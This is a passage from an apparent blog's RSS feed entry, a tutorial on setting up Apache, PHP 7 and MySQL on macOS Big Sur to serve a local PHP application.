Server built:   May  8 2021 03:38:34</code></pre><p>In order to start the server you can run:</p><pre><code>~ sudo apachectl start</code></pre><p>Open &#xA0;<code>localhost</code> in any browser and you should see:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-22-at-10.38.05.png" class="kg-image" alt="Running a PHP application on Big Sur using Apache" loading="lazy" width="413" height="105"></figure><h3 id="configuring-apache-to-run-php-7">Configuring Apache to run PHP 7</h3><p>Big Sur also comes with PHP installed, but the local Apache configs may not support running PHP by default. </p><p>In order to activate this setting, open <code>/etc/apache2/httpd.conf</code> with <code>nano</code> or any other text editor and uncomment the following line:</p><pre><code>LoadModule php7_module libexec/apache2/libphp7.so</code></pre><p>PHP is now enabled, all you need to do is restart the Apache web server for the changes to take effect:</p><pre><code>~ sudo apachectl restart</code></pre><h3 id="setting-up-mysql">Setting up mySQL</h3><p>Ensure that you have mySQL correctly installed and running on your machine.</p><ul><li>you can download the <code>.dmg</code> from <a href="https://dev.mysql.com/downloads/mysql/">here</a>, then follow the instructions on the wizard. </li><li>once the wizard is done go to <code>System Preferences</code> &gt; <code>MySQL</code> and ensure that the server is running as shown below:</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-22-at-11.43.55.png" class="kg-image" alt="Running a PHP application on Big Sur using Apache" loading="lazy" width="671" height="564" srcset="inesmartins.github.io/content/images/size/w600/2021/07/Screenshot-2021-07-22-at-11.43.55.png 600w, inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-22-at-11.43.55.png 671w"></figure><p>In order to have mySQL binaries available via command line, you can also add <code>/usr/local/mysql/bin/</code> to the <code>PATH</code>. In my case I did:</p><pre><code>~ nano ~/.zshrc
...
export PATH=/usr/local/mysql/bin:$PATH</code></pre><p>Finally, you need to ensure PHP and MySQL can communicate with one another, which you can achieve by running:</p><pre><code>~ cd /var
~ sudo mkdir mysql
~ cd mysql
~ sudo ln -s /tmp/mysql.sock mysql.sock</code></pre><h3 id="serving-the-application">Serving the application</h3><p>Check Apache&apos;s default <code>DocumentRoot</code> on <code>/etc/apache2/httpd.conf</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/image-1.png" class="kg-image" alt="Running a PHP application on Big Sur using Apache" loading="lazy" width="592" height="135"></figure><p>As you can see, in my case it&apos;s <code>/Library/WebServer/Documents</code>.</p><p>This means that this is the <strong>directory where you should put your PHP application</strong>.</p><p>Once the app is inside this directory you&apos;ll be able to see it running by going to &#xA0;<a href="http://localhost/app/web/">http://localhost/&lt;</a>path-to-your-initial-file&gt;.</p>]]></content:encoded></item></channel></rss>